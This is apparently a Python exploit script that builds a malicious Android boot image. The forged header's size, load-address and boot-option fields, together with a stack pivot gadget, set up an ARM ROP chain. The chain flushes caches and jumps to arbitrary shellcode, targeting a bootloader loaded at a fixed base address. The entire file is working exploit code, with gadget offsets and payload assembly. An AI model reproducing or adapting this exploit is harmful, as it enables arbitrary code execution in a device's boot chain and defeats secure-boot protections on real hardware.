import sys
import struct

base = 0x81E00000

#  bda4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xbda4

# 3cb80:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
pop_pc = base + 0x3cb80

# 2098:       4798            blx     r3 ; pop     {r3, pc}
blx_r3_pop_r3 = base + 0x2098|1

cache_func = base + 0x3CB70

test = base + 0x08B0|1 # prints "Error, the pointer of pidme_data is NULL."

inject_addr = base + 0x80000
inject_sz = 0x1000

shellcode_addr = inject_addr + 0x100
shellcode_sz = 0x200 # TODO: check size

# 5c49c:       e813e93c        ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
pivot = base + 0x5c49c;


def main():
    with open(sys.argv[1], "rb") as fin:
        orig = fin.read(0x400)
        fin.seek(0x800)
        orig += fin.read()

    hdr = bytes.fromhex("414E44524F494421")
    hdr += struct.pack("<II", inject_sz, inject_addr - 0x10)
    hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
    hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
    hdr += b"\x00" * 0xE
    # hdr += b"\x00" * 0x10 # TODO: this corresponds to inject_addr - 0x10 - fix this hack!
    hdr += struct.pack("<II", inject_addr + 0x48, pivot) # r3, pc (+0x4C because gadget arg points at the end of ldm package)
    hdr += b"\x00" * 0x24
    hdr += struct.pack("<III", inject_addr + 0x5C, 0, pop_pc) # sp, lr, pc #12
    hdr += b"\x00" * 0x10

    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc,
        shellcode_addr,               # r0
        shellcode_sz,                 # r1
        0xDEAD,                       # r2
        cache_func,                   # r3
        0xDEAD,                       # r4
        0xDEAD,                       # r6
        0xDEAD,                       # r7
        0xDEAD,                       # r8
        0xDEAD,                       # ip
        0xDEAD,                       # lr
        blx_r3_pop_r3,                # pc
        0xDEAD,                       # r3
        shellcode_addr                # pc
    ]
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    hdr += chain_bin

    want_len = shellcode_addr - inject_addr + 0x40 + 0x10
    hdr += b"\x00" * (want_len - len(hdr))

    with open(sys.argv[2], "rb") as fin:
        shellcode = fin.read()

    if len(shellcode) > shellcode_sz:
        raise RuntimeError("shellcode too big!")

    hdr += shellcode

    hdr += b"\x00" * (0x400 - len(hdr))
    hdr += orig

    with open(sys.argv[3], "wb") as fout:
        fout.write(hdr)


if __name__ == "__main__":
    main()
